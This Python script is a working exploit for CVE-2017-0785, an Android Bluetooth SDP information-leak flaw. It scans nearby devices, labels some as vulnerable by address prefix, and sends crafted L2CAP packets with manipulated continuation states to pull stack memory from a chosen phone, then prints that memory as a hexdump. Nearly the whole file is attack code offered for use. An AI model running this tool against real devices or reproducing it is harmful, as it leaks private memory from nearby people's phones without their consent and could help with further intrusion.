# -------------------------------------------------------------------------------------------------------------------------------------------------------------
# the Android information leak vulnerability
# @Authors:  Authors: Shir, Hodaya and Alexey
# @Version: 1.0
# @Date 07.2019
# -------------------------------------------------------------------------------------------------------------------------------------------------------------
from classes.deviceslist import devices
from classes import wcolors
from prettytable import PrettyTable
from bluetooth import *
from pwn import *
import argparse
import os
import sys
import subprocess
from time import sleep

# global variables
devicelookup = devices.get_devices()        # list of devices according to manufacturer
service_long = 0x0100
service_short = 0x0001
mtu = 50
n = 49


# function search manufacturer of device
def is_device_vulnerable(addr):
    manufacturers = devicelookup["ANDROIDS"]
    for manufacturer in manufacturers:
        # search manufacturer
        lookups = manufacturers[manufacturer]
        for address in lookups:
            if (address == addr[:8]):                       # first 4 bytes of bluetooth address
                return True, str(manufacturer)
    return False, 'Don\'t know'


# function that scans bluetooth devices
def FindDevices(_duration):
    # use table to display devices
    BTable = PrettyTable(['Index', 'Bluetooth Address', 'Bluetooth Name', 'Manufacturer', 'Vulnerable'])
    nearby_devices = discover_devices(duration = _duration)
    addresses = []
    for (i, address) in enumerate(nearby_devices):
        vulnerable, company = is_device_vulnerable(address)
        addresses.append(address)
        if (vulnerable):
            BTable.add_row([str(i+1), address, lookup_name(address), company, 'Yes'])
        else:
            BTable.add_row([str(i+1), address, lookup_name(address), company, 'None'])
    print BTable
    return addresses

def packet(service, continuation_state):
    pkt = '\x02\x00\x00'
    pkt += p16(7 + len(continuation_state))
    pkt += '\x35\x03\x19'
    pkt += p16(service)
    pkt += '\x01\x00'
    pkt += continuation_state
    return pkt

# function use CVE-2017-0785 vulnerable for Memory leak
def CVE_2017_0785(target):
    print(wcolors.color.BLUE + "[*] Bluetooth Ping Of Death Attack Started ..." + wcolors.color.ENDC)
    p = log.progress('Exploit')
    p.status('Creating L2CAP socket')

    sock = BluetoothSocket(L2CAP)
    set_l2cap_mtu(sock, mtu)
    context.endian = 'big'

    p.status('Connecting to target')
    sock.connect((target, 1))

    p.status('Sending packet 0')
    sock.send(packet(service_long, '\x00'))
    data = sock.recv(mtu)

    if data[-3] != '\x02':
        log.error('Invalid continuation state received.')

    stack = ''
    try:
        for i in range(1, n):
            p.status('Sending packet %d' % i)
            sock.send(packet(service_short, data[-3:]))
            data = sock.recv(mtu)
            stack += data[9:-3]

    except(KeyboardInterrupt, OSError):
        print(wcolors.color.RED + "[!] Something Is Wrong ! DeAuth Exit." + wcolors.color.ENDC)

    log.success(wcolors.color.BLUE + 'Done.' + wcolors.color.ENDC)
    sock.close()
    return stack

if __name__ == "__main__":
    # construct the argument and parse the arguments
    ap = argparse.ArgumentParser()
    ap.add_argument("-d", "--duration", type = int, default = 3,
                    help="duration for finding bluetooth devices command")
    ap.add_argument("-s", "--size", type = int, default = 600,
                    help="the size of the data packets to be sent")
    ap.add_argument("-n", "--name", type = str, default = 'BT_Ariel',
                    help="bluetooth broadcast device name")
    args = vars(ap.parse_args())
    # to change Bluetooth broadcast device name?
    change_dn = "hciconfig hci0 name " + args["name"]
    subprocess.Popen(change_dn, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

    # scan devices
    addresses = FindDevices(args["duration"])
    
    print(wcolors.color.GREEN + "Choose BDDR by Index" + wcolors.color.ENDC)
    device_choice = input()
    device_choice = device_choice-1
    if (type(device_choice) == type(n) and device_choice < len(addresses) and device_choice > -1): 
        stack = CVE_2017_0785(addresses[device_choice])
        print hexdump(stack)
    else:
        print(wcolors.color.RED + "[!] Something Is Wrong ! DeAuth Exit." + wcolors.color.ENDC)
        exit(1)
    
    print ("\n\x1b[1;35m                             ")
    print ("    _    (^)                             ")
    print ("   (_\   |_|                             ")
    print ("    \_\  |_|                             ")
    print ("    _\_\,/_|                             ")
    print ("   (`\(_|`\|                             ")
    print ("  (`\,)  \ \'                            ")
    print ("   \,)   | |                             ")
    print ("     \__(__|\x1b[0m                      ")
    print ("                                         ")
    print ("\x1b[1;35m        Peace brothers and sisters!       ")
    print ("\n                                       ")
